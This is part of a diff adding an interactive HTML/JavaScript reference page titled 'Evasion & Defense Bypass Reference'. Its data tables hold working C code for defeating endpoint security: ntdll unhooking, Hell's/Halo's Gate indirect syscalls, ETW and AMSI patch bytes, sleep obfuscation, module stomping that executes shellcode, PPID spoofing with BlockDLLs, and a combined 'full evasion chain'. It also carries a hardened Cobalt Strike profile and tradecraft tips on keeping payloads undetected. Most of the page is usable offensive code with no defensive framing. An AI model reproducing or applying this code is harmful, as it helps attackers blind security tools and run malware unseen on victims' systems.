+{t:"Enumerate loaded minifilters",l:"c",c:"// List minifilter drivers (fltMC equivalent)\n// Requires admin privileges\n\n// PowerShell:\n// fltMC.exe\n// Output shows: Filter Name, Altitude, Instances\n// EDR filters typically at altitude > 320000\n\n// Common EDR minifilters:\n// CrowdStrike: csagent (altitude ~328010)\n// SentinelOne: sentinelmonitor\n// Carbon Black: carbonblackk\n// Defender: WdFilter (altitude 328010)\n\n// Programmatic enumeration:\n// FilterFindFirst / FilterFindNext API\n// Or: NtQuerySystemInformation(SystemFilters)\n\n// Key insight:\n// Minifilters see ALL file I/O from usermode\n// You cannot bypass them without a kernel driver\n// Strategy: avoid file I/O for payloads (in-memory only)"}
+];
+C.uhk=[
+{t:"Full ntdll unhook from KnownDlls",l:"c",c:"void UnhookNtdll(void) {\n    // Open clean ntdll from kernel KnownDlls cache\n    HANDLE hSection;\n    UNICODE_STRING name;\n    RtlInitUnicodeString(&name, L\"\\\\KnownDlls\\\\ntdll.dll\");\n    OBJECT_ATTRIBUTES oa;\n    InitializeObjectAttributes(&oa, &name,\n        OBJ_CASE_INSENSITIVE, NULL, NULL);\n    NtOpenSection(&hSection, SECTION_MAP_READ, &oa);\n\n    // Map clean copy\n    PVOID clean = NULL; SIZE_T sz = 0;\n    NtMapViewOfSection(hSection, (HANDLE)-1, &clean,\n        0, 0, NULL, &sz, 1, 0, PAGE_READONLY);\n\n    // Get hooked ntdll\n    HMODULE hNtdll = GetModuleHandleA(\"ntdll.dll\");\n    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)\n        ((PBYTE)hNtdll + ((PIMAGE_DOS_HEADER)hNtdll)->e_lfanew);\n    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);\n\n    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {\n        if (memcmp(sec[i].Name, \".text\", 5) == 0) {\n            PVOID dst = (PBYTE)hNtdll + sec[i].VirtualAddress;\n            PVOID src = (PBYTE)clean + sec[i].VirtualAddress;\n            DWORD old;\n            VirtualProtect(dst, sec[i].Misc.VirtualSize,\n                PAGE_EXECUTE_READWRITE, &old);\n            memcpy(dst, src, sec[i].Misc.VirtualSize);\n            VirtualProtect(dst, sec[i].Misc.VirtualSize,\n                old, &old);\n            break;\n        }\n    }\n    NtUnmapViewOfSection((HANDLE)-1, clean);\n}"},
+{t:"Unhook from suspended process",l:"c",c:"void UnhookFromSuspended(void) {\n    STARTUPINFOA si = {sizeof(si)};\n    PROCESS_INFORMATION pi;\n    // Spawn suspended - EDR hasn't injected yet\n    CreateProcessA(\"C:\\\\Windows\\\\System32\\\\notepad.exe\",\n        NULL, NULL, NULL, FALSE, CREATE_SUSPENDED,\n        NULL, NULL, &si, &pi);\n\n    // Read ntdll from clean process\n    HMODULE hNtdll = GetModuleHandleA(\"ntdll.dll\");\n    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)\n        ((PBYTE)hNtdll + ((PIMAGE_DOS_HEADER)hNtdll)->e_lfanew);\n    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);\n\n    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {\n        if (memcmp(sec[i].Name, \".text\", 5) == 0) {\n            SIZE_T txtSz = sec[i].Misc.VirtualSize;\n            PBYTE clean = (PBYTE)malloc(txtSz);\n            ReadProcessMemory(pi.hProcess,\n                (PBYTE)hNtdll + sec[i].VirtualAddress,\n                clean, txtSz, NULL);\n\n            DWORD old;\n            VirtualProtect((PBYTE)hNtdll + sec[i].VirtualAddress,\n                txtSz, PAGE_EXECUTE_READWRITE, &old);\n            memcpy((PBYTE)hNtdll + sec[i].VirtualAddress,\n                clean, txtSz);\n            VirtualProtect((PBYTE)hNtdll + sec[i].VirtualAddress,\n                txtSz, old, &old);\n            free(clean);\n            break;\n        }\n    }\n    TerminateProcess(pi.hProcess, 0);\n    CloseHandle(pi.hProcess);\n    CloseHandle(pi.hThread);\n}"}
+];
+C.sys=[
+{t:"Indirect syscall implementation",l:"c",c:"// Indirect syscall: setup args + JMP to syscall;ret in ntdll\n// Return address is inside ntdll = passes stack checks\n\n// 1. Resolve SSN and syscall;ret gadget\nDWORD GetSSN(LPCSTR funcName) {\n    HMODULE hNtdll = GetModuleHandleA(\"ntdll.dll\");\n    PBYTE func = (PBYTE)GetProcAddress(hNtdll, funcName);\n    // Clean: 4C 8B D1 B8 XX 00 00 00\n    if (func[0] == 0x4C && func[3] == 0xB8)\n        return *(DWORD*)(func + 4);\n    // Hooked: search neighbors (Halo's Gate)\n    for (int i = 1; i < 25; i++) {\n        PBYTE up = func - (i * 32);\n        if (up[0]==0x4C && up[3]==0xB8)\n            return *(DWORD*)(up+4) + i;\n        PBYTE dn = func + (i * 32);\n        if (dn[0]==0x4C && dn[3]==0xB8)\n            return *(DWORD*)(dn+4) - i;\n    }\n    return 0;\n}\n\nPVOID FindGadget(void) {\n    // Find syscall;ret (0F 05 C3) in ntdll .text\n    HMODULE h = GetModuleHandleA(\"ntdll.dll\");\n    // Walk .text section looking for 0F 05 C3\n    // Randomize: pick random occurrence each time\n    // ...\n}\n\n// 2. ASM stub (x64):\n// mov r10, rcx\n// mov eax, SSN\n// jmp [gadget_addr]  ; jumps to syscall;ret in ntdll"},
+{t:"Hell's Gate SSN resolution",l:"c",c:"typedef struct _VX_TABLE_ENTRY {\n    PVOID pAddress;\n    DWORD dwHash;\n    WORD wSSN;\n    PVOID pSyscallAddr; // for indirect\n} VX_TABLE_ENTRY;\n\nBOOL GetVxTableEntry(PVOID pFunc, VX_TABLE_ENTRY* entry) {\n    entry->pAddress = pFunc;\n    PBYTE f = (PBYTE)pFunc;\n\n    // Check if function is clean (not hooked)\n    // Expected: 4C 8B D1 B8 XX 00 00 00\n    if (f[0] == 0x4C && f[1] == 0x8B && f[2] == 0xD1 &&\n        f[3] == 0xB8 && f[6] == 0x00 && f[7] == 0x00) {\n        entry->wSSN = *(WORD*)(f + 4);\n        // Find syscall instruction for indirect call\n        for (DWORD i = 0; i < 32; i++) {\n            if (f[i] == 0x0F && f[i+1] == 0x05) {\n                entry->pSyscallAddr = f + i;\n                return TRUE;\n            }\n        }\n    }\n\n    // Function is hooked - use Halo's Gate\n    // Walk up and down neighbor functions\n    for (WORD idx = 1; idx < 500; idx++) {\n        // Check UP neighbor\n        PBYTE up = f - (idx * 32);\n        if (up[0]==0x4C && up[3]==0xB8) {\n            entry->wSSN = *(WORD*)(up+4) + idx;\n            return TRUE;\n        }\n        // Check DOWN neighbor\n        PBYTE dn = f + (idx * 32);\n        if (dn[0]==0x4C && dn[3]==0xB8) {\n            entry->wSSN = *(WORD*)(dn+4) - idx;\n            return TRUE;\n        }\n    }\n    return FALSE;\n}"}
+];
+C.etw=[
+{t:"ETW + AMSI combined bypass",l:"c",c:"void BlindDefenses(void) {\n    // 1. Patch EtwEventWrite (kill all usermode ETW)\n    PVOID pEtw = GetProcAddress(\n        GetModuleHandleA(\"ntdll.dll\"), \"EtwEventWrite\");\n    DWORD old;\n    VirtualProtect(pEtw, 4, PAGE_EXECUTE_READWRITE, &old);\n    // xor eax, eax; ret = 0x33C0C3 (return STATUS_SUCCESS)\n    *(DWORD*)pEtw = 0x00C3C033;\n    VirtualProtect(pEtw, 4, old, &old);\n\n    // 2. Patch AMSI (kill script scanning)\n    HMODULE hAmsi = LoadLibraryA(\"amsi.dll\");\n    if (hAmsi) {\n        PVOID pScan = GetProcAddress(hAmsi, \"AmsiScanBuffer\");\n        VirtualProtect(pScan, 6, PAGE_EXECUTE_READWRITE, &old);\n        // mov eax, 0x80070057; ret (E_INVALIDARG)\n        BYTE patch[] = {0xB8,0x57,0x00,0x07,0x80,0xC3};\n        memcpy(pScan, patch, 6);\n        VirtualProtect(pScan, 6, old, &old);\n    }\n\n    // Now: no ETW events + no AMSI scanning\n    // Safe to: load .NET, run PowerShell, inject, etc.\n}"}
+];
+C.ams=[
+{t:"AMSI bypass variants",l:"c",c:"// Variant 1: Patch AmsiScanBuffer (classic)\n// B8 57 00 07 80 C3 = mov eax, 0x80070057; ret\nBYTE patch1[] = {0xB8,0x57,0x00,0x07,0x80,0xC3};\n\n// Variant 2: Patch AmsiOpenSession\n// Force session open to fail\nBYTE patch2[] = {0x48,0x31,0xC0,0xC3}; // xor rax,rax; ret\n\n// Variant 3: .NET reflection (PowerShell)\n// $a=[Ref].Assembly.GetTypes() | Where-Object {\n//   $_.Name -like '*Utils'\n// }\n// $f=$a.GetFields('NonPublic,Static') | Where-Object {\n//   $_.Name -like '*Failed'\n// }\n// $f.SetValue($null,$true)\n\n// Variant 4: Forcing error in AmsiInitialize\n// Patch amsi.dll DllMain to return FALSE\n// Prevents AMSI initialization entirely\n\n// Variant 5: Hijack AMSI COM provider\n// Modify registry to point AMSI COM to dummy DLL\n// HKCU\\Software\\Classes\\CLSID\\{GUID}\\InProcServer32\n\n// Key: all variants must execute BEFORE\n// the malicious script/assembly runs"}
+];
+C.mem=[
+{t:"Sleep obfuscation (Ekko-style concept)",l:"c",c:"void SleepObfuscated(PVOID payload, SIZE_T size, DWORD ms) {\n    BYTE key[16];\n    BCryptGenRandom(NULL, key, 16,\n        BCRYPT_USE_SYSTEM_PREFERRED_RNG);\n\n    // Encrypt payload in-place\n    for (SIZE_T i = 0; i < size; i++)\n        ((PBYTE)payload)[i] ^= key[i % 16];\n\n    // Change to non-executable\n    DWORD old;\n    VirtualProtect(payload, size, PAGE_READWRITE, &old);\n\n    // Spoof call stack (simplified)\n    // Real Ekko uses ROP chain with NtContinue + timers\n    // to automate: encrypt -> sleep -> decrypt\n\n    Sleep(ms); // During sleep: RW, encrypted, clean stack\n\n    // Decrypt and restore permissions\n    VirtualProtect(payload, size, PAGE_EXECUTE_READ, &old);\n    for (SIZE_T i = 0; i < size; i++)\n        ((PBYTE)payload)[i] ^= key[i % 16];\n\n    // Full Ekko flow:\n    // 1. Create timer queue with two timers\n    // 2. Timer 1: ROP chain -> VirtualProtect(RW) -> encrypt -> NtContinue\n    // 3. Timer 2: decrypt -> VirtualProtect(RX) -> resume\n    // 4. No executable code running during sleep\n}"},
+{t:"Module stomping (DLL overwrite)",l:"c",c:"void ModuleStomp(PBYTE shellcode, SIZE_T scSize) {\n    // Load a sacrificial DLL\n    // Choose one: same size or larger than payload\n    HMODULE hDll = LoadLibraryExA(\n        \"C:\\\\Windows\\\\System32\\\\amsi.dll\", // any DLL\n        NULL, DONT_RESOLVE_DLL_REFERENCES);\n\n    // Get .text section\n    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)\n        ((PBYTE)hDll + ((PIMAGE_DOS_HEADER)hDll)->e_lfanew);\n    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);\n\n    PVOID textBase = NULL; DWORD textSize = 0;\n    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {\n        if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {\n            textBase = (PBYTE)hDll + sec[i].VirtualAddress;\n            textSize = sec[i].Misc.VirtualSize;\n            break;\n        }\n    }\n\n    if (textSize >= scSize) {\n        DWORD old;\n        VirtualProtect(textBase, scSize,\n            PAGE_READWRITE, &old);\n        memcpy(textBase, shellcode, scSize);\n        VirtualProtect(textBase, scSize,\n            PAGE_EXECUTE_READ, &old);\n        // Execute: shellcode now in image-backed memory\n        ((void(*)())textBase)();\n    }\n}"}
+];
+C.prc=[
+{t:"PPID spoof + BlockDLLs",l:"c",c:"void SpawnProtected(LPCSTR cmd, DWORD parentPid) {\n    SIZE_T sz;\n    InitializeProcThreadAttributeList(NULL, 2, 0, &sz);\n    LPPROC_THREAD_ATTRIBUTE_LIST al = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(sz);\n    InitializeProcThreadAttributeList(al, 2, 0, &sz);\n\n    // Attribute 1: PPID Spoof\n    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS,\n        FALSE, parentPid);\n    UpdateProcThreadAttribute(al, 0,\n        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,\n        &hParent, sizeof(HANDLE), NULL, NULL);\n\n    // Attribute 2: Block non-Microsoft DLLs (CIG)\n    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;\n    UpdateProcThreadAttribute(al, 0,\n        PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,\n        &policy, sizeof(policy), NULL, NULL);\n\n    STARTUPINFOEXA si = {0};\n    si.StartupInfo.cb = sizeof(si);\n    si.lpAttributeList = al;\n    PROCESS_INFORMATION pi;\n\n    CreateProcessA(NULL, (LPSTR)cmd, NULL, NULL, FALSE,\n        EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,\n        NULL, NULL, &si.StartupInfo, &pi);\n    // pi.hProcess: child with spoofed parent + blocked EDR DLLs\n    // Inject payload into this protected process\n}"}
+];
+C.kit=[
+{t:"Full evasion chain implementation",l:"c",c:"void FullChain(PBYTE shellcode, SIZE_T scSize) {\n    // Step 1: Blind ETW\n    PVOID pEtw = GetProcAddress(\n        GetModuleHandleA(\"ntdll.dll\"), \"EtwEventWrite\");\n    DWORD old;\n    VirtualProtect(pEtw, 4, PAGE_EXECUTE_READWRITE, &old);\n    *(DWORD*)pEtw = 0x00C3C033;\n    VirtualProtect(pEtw, 4, old, &old);\n\n    // Step 2: Unhook ntdll (indirect syscalls alternative)\n    // UnhookNtdll(); // or use syscalls directly\n\n    // Step 3: Spawn sacrificial with PPID + BlockDLLs\n    DWORD explorerPid = FindProcess(\"explorer.exe\");\n    SpawnProtected(\"RuntimeBroker.exe\", explorerPid);\n\n    // Step 4: Module stomp in target process\n    // Allocate via NtAllocateVirtualMemory (syscall)\n    // Write via NtWriteVirtualMemory (syscall)\n    // Protect via NtProtectVirtualMemory (syscall)\n    // All via indirect syscalls\n\n    // Step 5: Execute via callback (avoid CreateRemoteThread)\n    // NtQueueApcThread or thread pool callback\n\n    // Step 6: In beacon: sleep obfuscation active\n    // Encrypted during sleep, clean stack, RW memory\n\n    // Result:\n    // - ETW blind (step 1)\n    // - Hooks bypassed (step 2)\n    // - EDR can't inject into child (step 3)\n    // - Image-backed memory (step 4)\n    // - No CreateRemoteThread (step 5)\n    // - Memory scan resistant (step 6)\n}"}
+];
+C.byp=[
+{t:"Cobalt Strike malleable profile hardening",l:"c",c:"# Evasion-focused profile settings\n\nset host_stage \"false\";  # no staging = no scan\nset userwx \"false\";      # RW->RX, never RWX\nset cleanup \"true\";      # wipe shellcode after load\nset sleep_mask \"true\";   # encrypt during sleep\nset syscall_method \"indirect\"; # indirect syscalls\n\n# Process injection\nprocess-inject {\n    set allocator \"NtMapViewOfSection\"; # section-based\n    set min_alloc \"16384\";\n    set userwx \"false\";\n    set startrwx \"false\";\n    execute {\n        CreateThread \"ntdll!RtlUserThreadStart\";\n        NtQueueApcThread-s;  # special APC\n        CreateRemoteThread;  # fallback only\n    }\n}\n\n# Post-exploitation\npost-ex {\n    set spawnto_x64 \"%windir%\\\\sysnative\\\\dllhost.exe\";\n    set pipename \"Winsock2\\\\CatalogChangeListener-###-0\";\n    set obfuscate \"true\";\n    set smartinject \"true\";\n    set amsi_disable \"true\";\n    set thread_hint \"ntdll!RtlUserThreadStart\";\n}\n\n# Transform (code mutation)\ntransform-x64 {\n    prepend \"\\x90\\x90\\x90\";\n    strrep \"ReflectiveLoader\" \"\";\n    strrep \"beacon.dll\" \"\";\n}"}
+];
+return C[s]||[];
+}
+var TR={
+edr:[
+{t:"Kernel callbacks are the hardest telemetry to evade",d:"PsSetCreateProcessNotifyRoutine and friends fire in kernel space. No usermode technique can prevent them. You can only avoid triggering them (e.g., don't create new processes) or use a vulnerable driver."},
+{t:"ETW has two layers: usermode and kernel",d:"Patching EtwEventWrite kills usermode ETW. But EtwTi (Threat Intelligence) fires from the kernel on VirtualAlloc, thread creation, etc. Completely different attack surface."},
+{t:"Behavioral analysis correlates across telemetry",d:"EDR correlates: process tree + API sequence + memory + network. Evading one source isn't enough if the other three paint a clear picture. Address all layers."},
+{t:"Minifilters see everything touching disk",d:"Any file write goes through the minifilter stack. EDR minifilters scan files on creation. Solution: never touch disk. In-memory only for all payloads."}
+],
+uhk:[
+{t:"Full unhook makes ntdll .text private memory",d:"Remapping ntdll overwrites the image-backed .text with private memory. Memory scanners detect this mismatch. Selective patching or syscalls avoid this artifact."},
+{t:"Suspended process gives pre-hook ntdll",d:"At process creation but before EDR's DLL injection, ntdll is clean. Read it from a suspended process you create. Terminate the process afterward."},
+{t:"Selective unhook has smallest footprint",d:"Only restore the exact functions you need (NtAllocateVirtualMemory, etc.). 5-6 functions patched vs entire .text section. Much harder for EDR to detect the restoration."},
+{t:"Hook detection reveals EDR capabilities",d:"Before unhooking, enumerate what's hooked. This tells you exactly which APIs the EDR monitors. May reveal blind spots where no hooks exist."}
+],
+sys:[
+{t:"Indirect syscalls are the current gold standard",d:"Direct syscalls leave the return address in your module (suspicious). Indirect syscalls JMP to syscall;ret inside ntdll, so the return address looks legitimate. Always use indirect."},
+{t:"SSNs change between Windows builds",d:"Never hardcode SSNs. Use Hell's Gate / Halo's Gate to resolve dynamically at runtime. Hardcoded SSNs break on the wrong OS version."},
+{t:"Rotate syscall gadgets per call",d:"Don't use the same syscall;ret gadget address every time. There are dozens in ntdll. Random selection per call prevents pattern-based detection."},
+{t:"Syscalls don't bypass kernel ETW",d:"Syscalls bypass usermode hooks but the kernel still sees the syscall. EtwTi will still fire on sensitive operations like VirtualAlloc with execute permissions."}
+],
+etw:[
+{t:"Patch ETW BEFORE any payload execution",d:"ETW events fire immediately. If you load a .NET assembly before patching, the CLR ETW provider has already reported it. Sequence matters: patch first, execute second."},
+{t:"EtwTi is kernel-level and unfixable from usermode",d:"The Threat Intelligence ETW provider runs in kernel space. No amount of usermode patching affects it. Strategy: avoid triggering its events rather than trying to disable it."},
+{t:"Provider-specific disable is more surgical",d:"Instead of killing all ETW via EtwEventWrite, disable only the providers the EDR consumes. Less collateral damage, less likely to be detected as a blanket bypass."},
+{t:".NET CLR ETW reveals Assembly.Load",d:"The DotNETRuntime ETW provider logs every assembly load, method JIT, and exception. If you use .NET in-memory, patch CLR ETW or patch EtwEventWrite before CLR initialization."}
+],
+ams:[
+{t:"AMSI must be bypassed before script execution",d:"AMSI scans happen before the script engine executes code. Your bypass must run first. Use a clean loader that patches AMSI, then loads the malicious script."},
+{t:"amsiInitFailed is heavily signatured",d:"The classic .NET reflection bypass is one of the most-signatured AMSI bypasses. Obfuscate heavily or use alternative methods like patching AmsiOpenSession."},
+{t:"AMSI exists in every script host independently",d:"Each process that loads amsi.dll has its own copy. Patching in PowerShell doesn't affect wscript.exe or msbuild.exe. Patch per-process as needed."},
+{t:"Excel 4.0 macros bypass AMSI (no VBA engine)",d:"XLM macros use the old Excel macro engine which doesn't have AMSI integration. Much less monitored than VBA, though increasingly detected behaviorally."}
+],
+mem:[
+{t:"Private RWX memory is always suspicious",d:"No legitimate application needs private RWX memory. It's the #1 memory scanner flag. Use RW then RX (never RWX), or stomp a module for image-backed memory."},
+{t:"Sleep obfuscation defeats periodic memory scans",d:"EDR scans memory periodically (not continuously). If your payload is encrypted during the scan window, it appears as a random RW blob. Decrypt only during active execution."},
+{t:"Module stomping gives image-backed legitimacy",d:"Overwriting a loaded DLL's .text section means your code lives in image-backed memory. Memory scanners expect code there. The file-on-disk mismatch is the detection vector."},
+{t:"Stack spoofing hides your beacon's sleep location",d:"A sleeping thread with a call stack showing beacon.dll -> Sleep -> ntdll is obvious. Spoof the stack to show kernel32 -> ntdll instead. Essential for long-haul beacons."}
+],
+prc:[
+{t:"BlockDLLs prevents EDR DLL injection",d:"PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES blocks all non-MS DLLs. EDR can't inject its hooking DLL. The child process runs without usermode EDR visibility."},
+{t:"PPID spoofing defeats process tree analysis",d:"EDR expects: outlook.exe -> cmd.exe to be suspicious. With PPID spoof showing explorer.exe -> RuntimeBroker.exe, the tree looks normal."},
+{t:"CFG is increasingly enforced",d:"Control Flow Guard validates indirect call targets. If your shellcode calls functions not in the CFG bitmap, it crashes. Use SetProcessValidCallTargets or CFG-aware techniques."},
+{t:"PPL requires kernel-level bypass",d:"Protected Process Light on LSASS blocks all handle operations from unprotected processes. Only a kernel driver (vulnerable or signed) can bypass it. PPLFault exploits implementation bugs."}
+],
+kit:[
+{t:"Test against the actual target EDR",d:"Generic bypasses don't work. CrowdStrike, SentinelOne, and Defender all have different detection strengths. Build and test against the specific product you'll face."},
+{t:"Never upload to VirusTotal",d:"VT shares samples with all AV vendors. Your custom payload becomes a signature within hours. Use private analysis environments: local VMs with the target EDR installed."},
+{t:"Layer evasion techniques incrementally",d:"Start with stock payload, identify what gets caught, fix that specific detection, repeat. Don't try to implement everything at once. Understand what each layer addresses."},
+{t:"Elastic EDR rules are publicly available",d:"Elastic publishes their detection rules on GitHub. You can read exactly what they detect and craft payloads that avoid those specific patterns. Other EDRs are black boxes."}
+],
+byp:[
+{t:"The full chain addresses every detection layer",d:"ETW (step 1) + unhook/syscalls (step 2) + BlockDLLs (step 3) + module stomp (step 4) + callback execution (step 5) + sleep obfuscation (step 6) = comprehensive evasion."},
+{t:"Cobalt Strike profiles make or break evasion",d:"Default CS profile is instantly detected. A hardened malleable profile with sleep_mask, indirect syscalls, userwx false, and proper spawnto is essential."},
+{t:"Defender relies heavily on AMSI and cloud",d:"Microsoft Defender's primary detection is AMSI + cloud sample submission + SmartScreen. Bypass AMSI and avoid first-seen cloud analysis, and static evasion becomes much easier."},
+{t:"Memory scanners check periodically, not continuously",d:"EDR memory scanning is resource-intensive and runs on intervals (seconds to minutes). Sleep obfuscation exploits this gap. Be encrypted during the scan, decrypted between scans."}
+]
+};
+function render(){
+var si=SE.findIndex(function(x){return x.id===S.s}),so=SE[si];
+var codes=getCodes(S.s),tricks=TR[S.s]||[];
+var flow='';
+if(S.s==='edr')flow=fEDR();else if(S.s==='uhk')flow=fUHK();else if(S.s==='sys')flow=fSYS();
+else if(S.s==='etw')flow=fETW();else if(S.s==='ams')flow=fAMS();else if(S.s==='mem')flow=fMEM();
+else if(S.s==='prc')flow=fPRC();else if(S.s==='kit')flow=fKIT();else if(S.s==='byp')flow=fBYP();
+var chtml=codes.length===0?'<div style="color:#4b5563;padding:16px;text-align:center">No code examples.</div>':
+codes.map(function(c,i){return'<div class="cp" data-ci="'+i+'"><button class="ct2"><span class="cv">&#9654;</span><span class="tl">'+c.t+'</span>'+T(c.l,"#6b7280",1)+'</button></div>'}).join('');
+var thtml=tricks.length===0?'':
+'<div style="font-size:.68em;font-weight:800;color:#f97316;letter-spacing:.08em;margin-bottom:6px">TRADECRAFT</div>'+
+tricks.map(function(t,i){return'<div class="ti" data-ti="'+i+'"><button class="tt"><span class="cv" style="color:#f97316;font-size:10px">&#9654;</span><span class="tn">'+t.t+'</span></button></div>'}).join('');
+var pv=si>0?'<button class="nb2" data-nv="'+SE[si-1].id+'">\u2190 '+SE[si-1].l+'</button>':'';
+var nx=si<SE.length-1?'<button class="nb2" data-nv="'+SE[si+1].id+'">'+SE[si+1].l+' \u2192</button>':'';
+$('#app').innerHTML=
+'<div class="hd"><div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px;margin-bottom:6px"><div><h1>Evasion &amp; Defense Bypass Reference</h1><div class="sub">EDR Internals \u2022 Unhooking \u2022 Syscalls \u2022 ETW \u2022 AMSI \u2022 Memory \u2022 Process/Thread \u2022 Toolkit \u2022 Full Chains</div></div></div><div class="st">'+
+SE.map(function(s){return'<button class="sb'+(S.s===s.id?' on':'')+'" style="'+(S.s===s.id?'color:'+s.c+';border-bottom-color:'+s.c:'')+'" data-sc="'+s.id+'">'+s.i+' '+s.l+'</button>'}).join('')+
+'</div></div><div class="ut"><button class="ub'+(S.t==='flow'?' on':'')+'" data-tb="flow">\u{1F4CA} Flow</button><button class="ub'+(S.t==='code'?' on':'')+'" data-tb="code">\u{1F4BB} Code'+(codes.length?' <span class="cnt">'+codes.length+'</span>':'')+'</button><button class="ub'+(S.t==='tricks'?' on':'')+'" data-tb="tricks">\u{1F512} Tradecraft'+(tricks.length?' <span class="cnt">'+tricks.length+'</span>':'')+'</button></div>'+
+'<div class="ct"><div style="display:flex;align-items:center;gap:6px;margin-bottom:6px"><span style="font-size:1em">'+so.i+'</span><h2 style="font-size:.9em;font-weight:700">'+so.l+'</h2>'+T(so.l,so.c)+'<div style="margin-left:auto;display:flex;gap:3px">'+pv+nx+'</div></div>'+
+'<div id="tf" style="'+(S.t!=='flow'?'display:none':'')+'">'+flow+'</div>'+
+'<div id="tc" style="'+(S.t!=='code'?'display:none':'')+'">'+chtml+'</div>'+
+'<div id="tt" style="'+(S.t!=='tricks'?'display:none':'')+'">'+thtml+'</div></div>'+
+'<div class="ft">'+[{c:"#f87171",l:"EDR Internals"},{c:"#60a5fa",l:"Unhooking"},{c:"#a78bfa",l:"Syscalls"},{c:"#fbbf24",l:"ETW"},{c:"#34d399",l:"AMSI"},{c:"#e879f9",l:"Memory"},{c:"#f59e0b",l:"Process"},{c:"#f472b6",l:"Toolkit"},{c:"#fb923c",l:"Full Chains"}].map(function(x){return'<div style="display:flex;align-items:center;gap:3px"><span class="dt" style="background:'+x.c+'"></span><span style="color:#4b5563">'+x.l+'</span></div>'}).join('')+'</div>';
+$$('[data-sc]').forEach(function(b){b.onclick=function(){S.s=b.dataset.sc;S.t='flow';render()}});
+$$('[data-tb]').forEach(function(b){b.onclick=function(){S.t=b.dataset.tb;render()}});
+$$('[data-nv]').forEach(function(b){b.onclick=function(){S.s=b.dataset.nv;S.t='flow';render()}});
+$$('.cp').forEach(function(p){
+p.querySelector('.ct2').onclick=function(){
+var ex=p.querySelector('.cb'),cv=p.querySelector('.cv');
+if(ex){ex.remove();cv.classList.remove('op');return}
+cv.classList.add('op');
+var ci=parseInt(p.dataset.ci),c=codes[ci];
+var pre=document.createElement('pre');pre.className='cb mono';
+pre.innerHTML=c.c.split('\n').map(function(line){
+var ci2=line.indexOf('//');
+if(ci2>=0)return esc(line.slice(0,ci2))+'<span class="cm">'+esc(line.slice(ci2))+'</span>';
+if(line.trimStart().charAt(0)==='#')return'<span class="pp">'+esc(line)+'</span>';
+return esc(line);
+}).join('\n');
+p.appendChild(pre);};
+});
+$$('.ti').forEach(function(p){
+p.querySelector('.tt').onclick=function(){
+var ex=p.querySelector('.td'),cv=p.querySelector('.cv');
+if(ex){ex.remove();p.classList.remove('op');cv.classList.remove('op');return}
+p.classList.add('op');cv.classList.add('op');
+var ti=parseInt(p.dataset.ti);
+var div=document.createElement('div');div.className='td';div.textContent=tricks[ti].d;
+p.appendChild(div);};
+});
+}
+render();
+</script>
+</body>
+</html>
